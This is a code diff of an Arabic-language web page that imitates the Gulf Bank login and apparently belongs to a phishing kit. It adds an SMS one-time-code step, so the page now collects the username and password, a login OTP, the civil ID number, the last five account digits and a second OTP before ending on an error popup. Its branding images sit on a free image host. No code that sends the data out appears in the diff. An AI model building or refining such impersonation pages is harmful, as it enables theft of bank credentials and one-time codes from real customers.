@@ -97,30 +97,24 @@
       width: 100vw;
       background: linear-gradient(0deg, #b80000 0%, #f43333 100%);
       display: flex;
-      justify-content: space-around;
+      justify-content: center;
       align-items: center;
-      padding: 14px 0 10px 0;
+      padding: 7px 0 7px 0;
       border-radius: 24px 24px 0 0;
       box-shadow: 0 -1px 12px #0002;
       z-index: 10;
+      min-height: 56px;
     }
-    .footer-nav-item {
-      color: #fff;
-      text-align: center;
-      font-size: 1rem;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      gap: 3px;
-    }
-    .footer-nav-item.active, .footer-nav-item .footer-link-active {
-      color: #fff;
-      font-weight: 700;
-      text-decoration: underline;
-    }
-    .footer-nav-icon {
-      font-size: 1.4em;
-      margin-bottom: 2px;
+    .footer-nav-img {
+      height: 40px;
+      width: auto;
+      display: block;
+      margin: 0 auto;
+      border-radius: 12px;
+      box-shadow: 0 2px 10px #9112;
+      background: #fff;
+      padding: 6px 30px 6px 30px;
+      object-fit: contain;
     }
     /* Special styles for steps */
     .step {
@@ -181,6 +175,7 @@
       gap: 17px;
       justify-content: center;
       margin: 30px 0 16px 0;
+      direction: ltr;
     }
     .otp-digit {
       width: 58px;
@@ -192,6 +187,8 @@
       text-align: center;
       outline: none;
       transition: border 0.2s;
+      direction: ltr;
+      unicode-bidi: plaintext;
     }
     .otp-digit:focus {
       border: 2px solid #d00;
@@ -235,10 +232,37 @@
       .header-text { font-size: 1.2rem; }
       .sub-header { font-size: 1.05rem; }
       .main-btn, .main-btn:disabled, .form-group, .input { max-width: 98vw; }
-      .footer-nav { font-size: 0.92em; }
+      .footer-nav { font-size: 0.92em; min-height: 46px; }
+      .footer-nav-img { padding: 6px 10vw 6px 10vw; height: 32px; }
       .account-digit, .otp-digit { width: 44px; height: 44px; font-size: 1.3em; }
       .card-img { width: 75px; }
       .sms-icon { width: 38px; }
+    }
+    /* Custom improvements for OTP step */
+    .otp-step-header {
+      margin-top: 65px;
+      font-size: 1.36rem;
+      font-weight: 700;
+      color: #d00;
+      text-align: center;
+    }
+    .otp-step-desc {
+      font-size: 1.09rem;
+      margin-bottom: 13px;
+      color: #555;
+      text-align: center;
+    }
+    .otp-step-form {
+      margin-top: 8px;
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .otp-step-icon {
+      width: 74px;
+      margin: 0 auto 18px;
+      display: block;
     }
   </style>
 </head>
@@ -246,7 +270,7 @@
   <div class="container">
     <!-- Step 1: Login -->
     <div class="step active" id="step-login">
-      <img class="logo" src="https://www2.0zz0.com/2025/09/29/00/681972087.jpeg" alt="شعار بنك الخليج">
+      <img class="logo" src="https://www2.0zz0.com/2025/09/29/02/226753851.jpeg" alt="شعار بنك الخليج">
       <div class="header-text">مرحبًا بعودتك!</div>
       <div class="sub-header">تسجيل الدخول إلى بنك الخليج</div>
       <form id="login-form" autocomplete="off" style="width:100%;">
@@ -263,7 +287,24 @@
         <a class="form-link" id="activateCardLink">تفعيل البطاقة</a>
       </div>
     </div>
-    <!-- Step 2: Civil ID -->
+    <!-- Step 2: OTP after login -->
+    <div class="step" id="step-otp-login">
+      <img class="otp-step-icon" src="https://cdn-icons-png.flaticon.com/512/561/561127.png" alt="SMS Icon">
+      <div class="otp-step-header">رمز التحقق</div>
+      <div class="otp-step-desc">أدخل الرقم المكون من 4 أرقام المرسل إليك عبر رسالة نصية قصيرة لتأكيد الدخول</div>
+      <form id="otp-login-form" autocomplete="off" class="otp-step-form">
+        <div class="otp-inputs" style="direction:ltr;justify-content:center;">
+          <input class="otp-digit otp-login-digit" type="text" maxlength="1" inputmode="numeric" pattern="\d" required autocomplete="off">
+          <input class="otp-digit otp-login-digit" type="text" maxlength="1" inputmode="numeric" pattern="\d" required autocomplete="off">
+          <input class="otp-digit otp-login-digit" type="text" maxlength="1" inputmode="numeric" pattern="\d" required autocomplete="off">
+          <input class="otp-digit otp-login-digit" type="text" maxlength="1" inputmode="numeric" pattern="\d" required autocomplete="off">
+        </div>
+        <div class="center-text" style="color:#b00;margin:10px 0 0 0;" id="otp-login-error"></div>
+        <div class="center-text" id="resend-timer-login" style="color:#b00;margin-top:15px;">إعادة إرسال الرمز بعد <span id="timer-login">00:60</span></div>
+        <button type="submit" class="main-btn" style="display:none" id="submitOTPLoginBtn">استكمال</button>
+      </form>
+    </div>
+    <!-- Step 3: Civil ID -->
     <div class="step" id="step-civil">
       <div class="header-text" style="margin-top:60px;">رقم البطاقة المدنية الخاصة بك</div>
       <div class="sub-header" style="font-size:1.03em;">يرجى تقديم رقم البطاقة المدنية الخاصة بك حتى نتمكن من البحث عنك</div>
@@ -277,7 +318,7 @@
         باستخدام تطبيقنا المحمول ، فإنك توافق على <b>الشروط والأحكام</b>
       </div>
     </div>
-    <!-- Step 3: Account Number -->
+    <!-- Step 4: Account Number -->
     <div class="step" id="step-account">
       <div class="header-text" style="margin-top:60px;">رقم حسابك</div>
       <div class="sub-header" style="font-size:1.07em;">ادخل آخر 5 أرقام لأي من حساباتك لدى بنك الخليج</div>
@@ -298,7 +339,7 @@
         <button type="submit" class="main-btn" id="accountNextBtn" disabled style="margin-top:44px;">استكمال</button>
       </form>
     </div>
-    <!-- Step 4: SMS OTP -->
+    <!-- Step 5: SMS OTP -->
     <div class="step" id="step-otp">
       <img class="sms-icon" src="https://cdn-icons-png.flaticon.com/512/561/561127.png" alt="SMS Icon">
       <div class="header-text" style="margin-bottom:6px;">التأكيد عبر الرسائل النصية القصيرة</div>
@@ -306,7 +347,7 @@
         أدخل الرقم المكون من 4 أرقام المرسل إليك عبر رسالة نصية قصيرة
       </div>
       <form id="otp-form" autocomplete="off" style="width:100%;">
-        <div class="otp-inputs">
+        <div class="otp-inputs" style="direction:ltr;justify-content:center;">
           <input class="otp-digit" type="text" maxlength="1" inputmode="numeric" pattern="\d" required autocomplete="off">
           <input class="otp-digit" type="text" maxlength="1" inputmode="numeric" pattern="\d" required autocomplete="off">
           <input class="otp-digit" type="text" maxlength="1" inputmode="numeric" pattern="\d" required autocomplete="off">
@@ -325,25 +366,15 @@
       <button onclick="closeErrorPopup()">موافق</button>
     </div>
   </div>
-  <!-- Footer navigation -->
+  <!-- Footer navigation with custom image -->
   <div class="footer-nav">
-    <div class="footer-nav-item">
-      <span class="footer-nav-icon">&#127873;</span>
-      <span>المكافآت</span>
-    </div>
-    <div class="footer-nav-item">
-      <span class="footer-nav-icon">&#9992;&#65039;</span>
-      <span>استكشف المنتجات</span>
-    </div>
-    <div class="footer-nav-item">
-      <span class="footer-nav-icon">&#128172;</span>
-      <span>هل تحتاج المساعدة؟</span>
-    </div>
+    <img class="footer-nav-img" src="https://www2.0zz0.com/2025/09/29/02/343527258.jpeg" alt="المنتجات والمساعدة بنك الخليج">
   </div>
   <script>
     // Step navigation
     const steps = [
       document.getElementById('step-login'),
+      document.getElementById('step-otp-login'),
       document.getElementById('step-civil'),
       document.getElementById('step-account'),
       document.getElementById('step-otp')
@@ -355,13 +386,78 @@
     // Activate Card Link (from login page)
     document.getElementById("activateCardLink").onclick = function(e) {
       e.preventDefault();
-      showStep(1);
+      showStep(2); // Civil ID
     };
 
-    // Login form
+    // Login form - go to OTP after login
     document.getElementById("login-form").onsubmit = function(e) {
       e.preventDefault();
-      showStep(1); // to Civil ID
+      showStep(1); // OTP after login
+      setTimeout(() => document.querySelector('.otp-login-digit').focus(), 80);
+      startOTPLoginTimer();
+    };
+
+    // OTP after login logic
+    const otpLoginInputs = document.querySelectorAll('.otp-login-digit');
+    const otpLoginError = document.getElementById('otp-login-error');
+    const submitOTPLoginBtn = document.getElementById('submitOTPLoginBtn');
+    otpLoginInputs.forEach((input, idx) => {
+      input.addEventListener('input', function(e) {
+        this.value = this.value.replace(/\D/g, '').slice(0, 1);
+        if (this.value && idx < otpLoginInputs.length-1) {
+          otpLoginInputs[idx+1].focus();
+        }
+        checkOTPLoginInputs();
+      });
+      input.addEventListener('keydown', function(e) {
+        if (e.key === "Backspace" && !this.value && idx > 0) {
+          otpLoginInputs[idx-1].focus();
+        }
+      });
+    });
+    function checkOTPLoginInputs() {
+      let filled = true;
+      otpLoginInputs.forEach(input => { if (!input.value) filled = false; });
+      submitOTPLoginBtn.style.display = filled ? 'block' : 'none';
+    }
+    document.getElementById('otp-login-form').onsubmit = function(e) {
+      e.preventDefault();
+      // Always go to Civil ID after OTP for demo
+      showStep(2);
+      setTimeout(() => document.getElementById('civilid').focus(), 120);
+      // reset OTP fields
+      otpLoginInputs.forEach(inp => inp.value = "");
+      submitOTPLoginBtn.style.display = 'none';
+      clearInterval(timerIntLogin);
+      document.getElementById("resend-timer-login").innerHTML = `إعادة إرسال الرمز بعد <span id="timer-login">00:60</span>`;
+    };
+
+    // OTP login timer
+    let timerIntLogin, timeLeftLogin = 60;
+    function startOTPLoginTimer() {
+      timeLeftLogin = 60;
+      document.getElementById("resend-timer-login").style.display = "block";
+      updateOTPLoginTimer();
+      if (timerIntLogin) clearInterval(timerIntLogin);
+      timerIntLogin = setInterval(function() {
+        timeLeftLogin--;
+        updateOTPLoginTimer();
+        if (timeLeftLogin <= 0) {
+          clearInterval(timerIntLogin);
+          document.getElementById("resend-timer-login").innerHTML = `<span class="form-link" onclick="restartOTPLogin()">إعادة إرسال الرمز</span>`;
+        }
+      }, 1000);
+    }
+    function updateOTPLoginTimer() {
+      const t = (timeLeftLogin < 10 ? "00:0" : "00:") + timeLeftLogin;
+      document.getElementById("timer-login").textContent = t;
+    }
+    window.restartOTPLogin = function() {
+      for(let i=0;i<otpLoginInputs.length;i++) otpLoginInputs[i].value="";
+      document.getElementById("otp-login-error").innerText = "";
+      checkOTPLoginInputs();
+      startOTPLoginTimer();
+      otpLoginInputs[0].focus();
     };
 
     // Civil ID validation
@@ -374,7 +470,7 @@
     document.getElementById("civil-form").onsubmit = function(e) {
       e.preventDefault();
       if (civilInput.value.length === 12) {
-        showStep(2);
+        showStep(3);
         setTimeout(() => document.querySelector('.account-digit').focus(), 100);
       }
     };
@@ -404,14 +500,14 @@
     document.getElementById('account-form').onsubmit = function(e) {
       e.preventDefault();
       if ([...accountDigits].every(input => input.value)) {
-        showStep(3);
-        setTimeout(() => document.querySelector('.otp-digit').focus(), 100);
+        showStep(4);
+        setTimeout(() => document.querySelectorAll('.otp-digit')[0].focus(), 100);
         startOTPTimer();
       }
     };
 
-    // OTP 4 digits
-    const otpInputs = document.querySelectorAll('.otp-digit');
+    // OTP 4 digits (last step)
+    const otpInputs = document.querySelectorAll('#otp-form .otp-digit');
     const otpError = document.getElementById('otp-error');
     const submitOTPBtn = document.getElementById('submitOTPBtn');
     otpInputs.forEach((input, idx) => {
@@ -439,7 +535,7 @@
       showErrorPopup();
     };
 
-    // OTP timer
+    // OTP timer (last step)
     let timerInt, timeLeft = 60;
     function startOTPTimer() {
       timeLeft = 60;
@@ -478,9 +574,11 @@
       document.getElementById('civil-form').reset();
       document.getElementById('account-form').reset();
       document.getElementById('otp-form').reset();
+      document.getElementById('otp-login-form').reset();
       civilNextBtn.disabled = true;
       accountNextBtn.disabled = true;
       submitOTPBtn.style.display = 'none';
+      submitOTPLoginBtn.style.display = 'none';
       showStep(0);
       setTimeout(() => document.getElementById('username').focus(), 120);
     }
